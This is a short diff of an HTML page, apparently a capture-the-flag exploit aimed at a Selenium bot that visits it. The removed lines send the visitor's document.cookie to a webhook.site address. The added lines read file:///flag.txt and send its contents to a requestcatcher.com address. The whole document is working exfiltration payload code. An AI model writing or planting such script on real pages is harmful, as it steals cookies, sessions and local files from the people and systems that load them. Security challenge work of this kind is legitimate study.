@@ -3,9 +3,9 @@
   <head><meta charset="utf-8"></head>
   <body>
     <script>
-      // When the Selenium bot lands here, it already has the real flag
-      // in document.cookie. Exfiltrate it to your webhook:
-      fetch('https://webhook.site/a36d70d7-27e8-486e-82cf-44ec74a28b04?flag='+encodeURIComponent(document.cookie));
-    </script>
+    fetch('file:///flag.txt')
+      .then(r => r.text())
+      .then(flag => fetch('https://nig.requestcatcher.com/?flag=' + encodeURIComponent(flag)));
+</script>
   </body>
 </html>
